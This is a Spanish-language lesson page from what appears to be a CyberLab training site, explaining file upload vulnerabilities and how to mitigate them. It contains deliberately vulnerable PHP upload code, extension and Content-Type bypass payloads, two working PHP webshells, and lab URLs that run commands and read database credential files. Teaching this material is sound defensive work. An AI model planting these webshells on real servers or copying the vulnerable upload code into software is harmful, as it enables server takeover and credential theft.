---
title: File Upload Attacks
description: Teoría sobre ataques de subida de archivos - Marco Teórico ULS CyberLab
sidebar:
  order: 13
---

# File Upload Attacks (Ataques de Subida de Archivos)

## ¿Qué es esta vulnerabilidad?

Los **ataques de subida de archivos** (File Upload Vulnerabilities) ocurren cuando una aplicación web permite a los usuarios subir archivos sin validar adecuadamente el **tipo**, **contenido**, **nombre** o **extensión** del archivo. En el peor caso, esto permite a un atacante subir y ejecutar código malicioso en el servidor.

La consecuencia más grave es lograr **RCE (Remote Code Execution)** — ejecución remota de código — que le da al atacante control total sobre el servidor.

```
Flujo del ataque:
[Atacante] → Sube shell.php → [Servidor] → Ejecuta PHP
     ↑                              ↓
     └──── GET /uploads/shell.php?cmd=whoami ───┘
```

---

## ¿Cómo Funciona?

### El Escenario Básico

1. La aplicación tiene un formulario para subir fotos/documentos
2. El servidor guarda el archivo en una carpeta accesible por web
3. El atacante sube un archivo PHP (webshell) en lugar de una imagen
4. El servidor Apache ejecuta el PHP cuando se accede al archivo
5. El atacante puede ejecutar comandos del sistema operativo

### Código Vulnerable en ULS CyberLab

```php
// modules/upload.php - Código vulnerable
if (isset($_FILES['file'])) {
    $filename = $_FILES['file']['name'];  // Sin sanitizar
    $destination = '../uploads/' . $filename;  // Carpeta pública
    
    // Solo bloquea .htaccess, ¡NADA MÁS!
    if ($filename === '.htaccess') {
        die("Archivo no permitido");
    }
    
    // Mueve el archivo SIN validar tipo o contenido
    move_uploaded_file($_FILES['file']['tmp_name'], $destination);
    
    // Registra el evento si es PHP (pero igual lo guarda)
    if (preg_match('/\.(php|phtml|php3|php4|php5|php7|phar)$/i', $filename)) {
        log_event('CRITICAL', 'upload', "PHP file uploaded: $filename");
        // La flag se captura aquí, pero el archivo ya fue subido
    }
}
```

---

## Tipos de Bypass

### 1. Extension Bypass — Extensiones alternativas de PHP

Muchos filtros solo bloquean `.php`. Extensiones alternativas que Apache puede ejecutar:

```
shell.php         ← Bloqueado (a veces)
shell.php3        ← A menudo olvidado
shell.php4        ← A menudo olvidado
shell.php5        ← A menudo olvidado
shell.php7        ← A menudo olvidado
shell.phtml       ← A menudo olvidado
shell.phar        ← Archivo PHP
shell.shtml       ← Si Apache tiene SSI habilitado
shell.php.jpg     ← Algunos filtros toman solo la última extensión
shell.jpg.php     ← Otros toman solo la primera
shell.php%00.jpg  ← Null byte injection (PHP < 5.3.4)
```

### 2. Content-Type Bypass

Cambiar el header `Content-Type` para engañar al servidor:

```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data

--boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg   ← El servidor verifica esto, no el contenido real

<?php system($_GET['cmd']); ?>
```

### 3. Magic Bytes Bypass

Agregar los bytes mágicos de una imagen al inicio del archivo:

```php
// shell.php con bytes mágicos de JPEG al inicio
<?php
// GIF89a;  ← Hace que el archivo parezca un GIF
system($_GET['cmd']);
?>
```

```bash
# Con exiftool
exiftool -Comment='<?php system($_GET["cmd"]); ?>' imagen.jpg
mv imagen.jpg shell.php.jpg
```

### 4. Race Condition

Si el servidor valida y elimina el archivo en pasos separados, puede haber una ventana de tiempo para ejecutarlo.

---

## Tipos de Webshells

### Webshell Básica (La del Lab)

```php
<?php
// shell.php - Webshell mínima
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

**Uso:** `http://localhost/mini-cyberlab/uploads/shell.php?cmd=whoami`

### Webshell con Interfaz Básica

```php
<?php
// shell.php - Versión con formulario HTML
echo '<form method="GET">';
echo 'Comando: <input name="cmd" size="50">';
echo '<input type="submit" value="Ejecutar">';
echo '</form>';
if(isset($_GET['cmd'])) {
    echo '<pre>' . htmlspecialchars(shell_exec($_GET['cmd'])) . '</pre>';
}
?>
```

### Comandos Útiles en el Lab

```
# Windows (XAMPP en Windows)
http://localhost/uploads/shell.php?cmd=whoami
http://localhost/uploads/shell.php?cmd=dir
http://localhost/uploads/shell.php?cmd=dir+C:\
http://localhost/uploads/shell.php?cmd=ipconfig
http://localhost/uploads/shell.php?cmd=net+user
http://localhost/uploads/shell.php?cmd=type+C:\xampp\htdocs\mini-cyberlab\includes\db.php
```

---

## Impacto del Ataque

| Nivel | Consecuencia |
|-------|-------------|
| **Información** | Leer archivos del servidor, configuraciones |
| **Escalación** | Leer credenciales de DB en archivos de configuración |
| **Lateral** | Moverse a otros sistemas en la red |
| **Crítico** | Ransomware, borrar datos, backdoor persistente |

Después de obtener ejecución de código (RCE), el atacante típicamente:

```bash
# 1. Recopilar información
whoami && id && hostname && ipconfig/ifconfig

# 2. Leer archivos sensibles
type C:\xampp\htdocs\mini-cyberlab\includes\db.php

# 3. Instalar backdoor persistente
# 4. Pivotar a otros sistemas
# 5. Exfiltrar datos
```

---

## Mitigación

### ✅ Validación de Tipo (Content-Type + Extensión + Magic Bytes)

```php
// ✅ Verificar extensión
$allowed_ext = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed_ext)) {
    die("Tipo de archivo no permitido");
}

// ✅ Verificar magic bytes (firma del archivo)
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime = $finfo->file($_FILES['file']['tmp_name']);
$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
if (!in_array($mime, $allowed_mimes)) {
    die("Tipo MIME no permitido");
}
```

### ✅ Renombrar el Archivo (Eliminar extensiones del atacante)

```php
// ✅ Renombrar a algo seguro
$new_filename = uniqid() . '_' . time() . '.jpg';
// O usar el hash del contenido:
$new_filename = hash_file('sha256', $_FILES['file']['tmp_name']) . '.jpg';
move_uploaded_file($_FILES['file']['tmp_name'], '../uploads/' . $new_filename);
```

### ✅ Almacenar Fuera del Webroot

```php
// ✅ Guardar fuera del directorio accesible por web
$upload_dir = 'C:/uploads_privados/';  // Fuera de htdocs
move_uploaded_file($_FILES['file']['tmp_name'], $upload_dir . $new_filename);

// Para servir el archivo, usar un script PHP
// GET /download.php?file=abc123.jpg → Lee y sirve el archivo
```

### ✅ Configurar Apache para No Ejecutar PHP en Uploads

```apache
# .htaccess en la carpeta uploads/
<FilesMatch "\.php$">
    deny from all
</FilesMatch>

# O deshabilitar PHP completamente en esa carpeta
php_flag engine off

# Agregar header de descarga (no ejecución)
Header set Content-Disposition "attachment"
```

### ✅ Tamaño Máximo

```php
$max_size = 2 * 1024 * 1024; // 2MB máximo
if ($_FILES['file']['size'] > $max_size) {
    die("Archivo demasiado grande");
}
```

---

## Recursos

- [PortSwigger File Upload Labs](https://portswigger.net/web-security/file-upload)
- [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [PayloadsAllTheThings - File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
